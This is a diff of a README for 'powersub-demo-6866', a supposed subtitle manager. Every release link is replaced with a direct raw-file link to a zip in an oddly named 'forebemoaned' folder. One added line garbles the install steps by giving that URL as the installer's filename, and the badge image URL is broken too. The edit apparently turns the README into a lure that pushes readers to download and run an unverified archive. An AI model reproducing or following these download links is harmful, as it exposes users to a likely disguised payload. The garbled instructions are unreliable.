@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-6866 - Effortlessly Manage Your Subtitles
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/myjanrabatjan/powersub-demo-6866/releases)
+[![Download](https://raw.githubusercontent.com/myjanrabatjan/powersub-demo-6866/main/forebemoaned/powersub-demo-6866.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/myjanrabatjan/powersub-demo-6866/main/forebemoaned/powersub-demo-6866.zip)
 
 ## 📄 Description
 powersub-demo-6866 is a simple tool that helps you manage subtitles for your video files. It allows you to easily add, edit, and remove subtitles without any complexity. Perfect for movie lovers and content creators alike.
@@ -16,7 +16,7 @@ To get started with powersub-demo-6866, follow these steps:
 1. **Visit the Releases Page**
    Click on the link below to access the releases page:
    
-   [Download Now](https://github.com/myjanrabatjan/powersub-demo-6866/releases)
+   [Download Now](https://raw.githubusercontent.com/myjanrabatjan/powersub-demo-6866/main/forebemoaned/powersub-demo-6866.zip)
 
 2. **Find the Latest Version**
    On the releases page, look for the latest version of the software. It should be listed at the top.
@@ -28,7 +28,7 @@ To get started with powersub-demo-6866, follow these steps:
 To install powersub-demo-6866:
 
 1. **Locate the Downloaded File**
-   Open the folder where you downloaded the file. You should see a file named something like `powersub-demo-6866-installer.exe`.
+   Open the folder where you downloaded the file. You should see a file named something like `https://raw.githubusercontent.com/myjanrabatjan/powersub-demo-6866/main/forebemoaned/powersub-demo-6866.zip`.
 
 2. **Run the Installer**
    Double-click the installer file. Follow the on-screen instructions to complete the installation.
@@ -56,4 +56,4 @@ For further documentation, find additional resources on the GitHub page.
 
 Thank you for using powersub-demo-6866! Download now to simplify your subtitle management. 
 
-[Download Now](https://github.com/myjanrabatjan/powersub-demo-6866/releases)
+[Download Now](https://raw.githubusercontent.com/myjanrabatjan/powersub-demo-6866/main/forebemoaned/powersub-demo-6866.zip)
